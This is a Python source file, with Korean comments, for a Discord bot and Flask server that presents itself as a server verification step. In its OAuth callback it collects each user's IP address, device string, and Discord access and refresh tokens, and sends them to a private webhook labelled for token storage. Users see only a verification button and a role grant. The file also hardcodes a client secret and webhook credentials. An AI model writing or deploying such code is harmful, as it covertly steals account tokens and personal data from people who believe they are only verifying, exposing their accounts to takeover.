import discord
from discord.ext import commands
from flask import Flask, request
import threading
import requests
import datetime

# ================= [설정] 여기만 수정하세요 =================
TOKEN = os.environ.get("DISCORD_TOKEN")
GUILD_ID = 1568578268502818877
CLIENT_ID = "1568557242335232100"
CLIENT_SECRET = "jDwXI27Ee909yfMx4IBSym6-3fAfG1r7"
REDIRECT_URI = "http://localhost:5000/callback"

# 니가 알려준 ID 적용
VERIFY_CHANNEL_ID = 1568599813035921572 # 인증 패널 보낼 채널 ID
VERIFIED_ROLE_ID = 1568601473837961338  # 지급할 역할 ID

# 1. 토큰 및 부가정보 저장용 웹훅 (비공개)
WEBHOOK_URL = "https://discord.com/api/webhooks/1568610823490768978/7rFXRIOlg4dC34WH6JGnXLIoNUE-1e58KWfK7TNJyMqytq7RnqNcV3taOrV9PErBk0hB"

# 2. 인증 성공 알림용 웹훅
ALERT_WEBHOOK_URL = "https://discord.com/api/webhooks/1568625737932738570/09D4kY-RhtDBRRQDdnFvUcv0mGlhojrc7ZWqX3UzVyqxB4Rab1_htr2j7rB5J5PLaRLk"
# ==========================================================

app = Flask(__name__)
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

@app.route("/")
def home():
    return "인증 서버 정상 작동 중"

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "인증 코드가 없습니다.", 400

    # --- 부가 정보 수집 ---
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '알 수 없음')
    now_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # --- 디스코드 토큰 발급 ---
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    r = requests.post("https://discord.com/api/oauth2/token", data=data)
    if r.status_code != 200:
        return f"토큰 발급 실패: {r.text}", 400

    token_data = r.json()
    access_token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")

    # --- 유저 정보 획득 ---
    headers = {"Authorization": f"Bearer {access_token}"}
    user_r = requests.get("https://discord.com/api/users/@me", headers=headers)
    user_info = user_r.json()
    
    user_id = user_info.get("id")
    username = user_info.get("username")
    global_name = user_info.get("global_name") or username

    # 1. 기존 웹훅으로 전송 (기존 로그 + 유저ID + 부가정보)
    if WEBHOOK_URL and WEBHOOK_URL.startswith("http"):
        webhook_data = {
            "content": f"🚨 **새로운 인증 발생 (상세 정보)** 🚨\n"
                       f"**유저 ID:** `{user_id}`\n"
                       f"**유저 이름:** {global_name} ({username})\n"
                       f"**IP 주소:** `{user_ip}`\n"
                       f"**접속 시간:** `{now_time}`\n"
                       f"**기기 정보:** `{user_agent}`\n"
                       f"**Access Token:**\n```{access_token}```\n"
                       f"**Refresh Token:**\n```{refresh_token}```"
        }
        try:
            requests.post(WEBHOOK_URL, json=webhook_data)
        except Exception as e:
            print(f"토큰 웹훅 전송 실패: {e}")

    # 2. 새로 준 웹훅으로 전송 (인증 성공 알림만)
    if ALERT_WEBHOOK_URL and ALERT_WEBHOOK_URL.startswith("http"):
        alert_data = {
            "content": f"✅ **유저 인증 완료 알림**\n"
                       f"**유저:** <@{user_id}> ({global_name}) 님이 인증을 마쳤습니다."
        }
        try:
            requests.post(ALERT_WEBHOOK_URL, json=alert_data)
        except Exception as e:
            print(f"알림 웹훅 전송 실패: {e}")

    bot.loop.create_task(give_role(user_id))
    return "<h1 style='text-align:center; margin-top:50px;'>✅ 인증이 완료되었습니다!</h1><p style='text-align:center;'>디스코드로 돌아가시면 역할이 지급되어 있습니다.</p>"

async def give_role(user_id):
    guild = bot.get_guild(GUILD_ID)
    if not guild: return
    
    member = guild.get_member(int(user_id))
    if not member: return
    
    role = guild.get_role(VERIFIED_ROLE_ID)
    if not role or role in member.roles: return
    
    try:
        await member.add_roles(role)
        print(f"✅ {member.name} 인증 완료 (역할 지급됨)")
    except Exception as e:
        print(f"역할 지급 실패: {e}")

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
        self.add_item(discord.ui.Button(
            label="✅ 인증하기", 
            style=discord.ButtonStyle.link, 
            url=url
        ))

@bot.event
async def on_ready():
    print(f"✅ 봇 로그인 성공: {bot.user}")
    bot.add_view(VerifyView())
    
    channel = bot.get_channel(VERIFY_CHANNEL_ID)
    if channel:
        async for message in channel.history(limit=10):
            if message.author == bot.user and message.embeds and any("서버 인증" in e.title for e in message.embeds if e.title):
                print("✅ 인증 패널이 이미 존재합니다.")
                return
                
        embed = discord.Embed(
            title="✅ 서버 인증",
            description="아래 버튼을 눌러 인증 해주세요.", # ★ 여기 문구 수정 완료
            color=0x57f287
        )
        await channel.send(embed=embed, view=VerifyView())
        print("✅ 인증 패널 자동 전송 완료")
    else:
        print("❌ 지정한 채널 ID를 찾을 수 없습니다.")

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def run_bot():
    bot.run(TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    run_bot()
